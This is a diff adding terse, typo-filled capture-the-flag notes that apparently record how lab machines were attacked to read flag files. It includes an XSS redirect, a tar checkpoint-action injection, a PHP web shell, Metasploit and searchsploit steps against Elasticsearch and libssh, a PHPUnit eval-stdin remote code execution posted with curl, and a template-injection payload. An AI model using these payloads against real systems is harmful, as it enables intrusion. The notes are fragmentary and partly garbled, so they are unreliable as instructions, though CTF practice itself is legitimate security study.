@@ -12,5 +12,21 @@ manual-review: <script>window.location.href="(request bin link)";</script>
 tartarsausage: cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag"
 
 
+site-bolt-user:admin :password-another file <?php echo system($_GET['cmd']);?> - .php -link+?cmd=cat+/flag.txt
+
+msfconsole- search elasticsearch -use 2 -info-set RHOSTS(IP)-RHOSTS(PORT) - info-run- whre is it saved-open
+
+sudo nmap -sV -A -T4 -sC -sS ip   - searchsploit libssh - searchsploit -m linux/remove/st.py - python3 st.py ip:port "c ..; cat flag.txt"
+
+dirsearch -u link  - curl link/composer.json- curl -i ip/vendor st.php- curl -s link/vendor/phpunit/phpunit/src/Util/PHP/eal-stdin.php --data "<?php system('cat /flag.txt'); ?>"
+
+${"z".join("ab")}.-burpsuit- repeater- 
+name=<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+
+cahnge id - cat flag
 
 
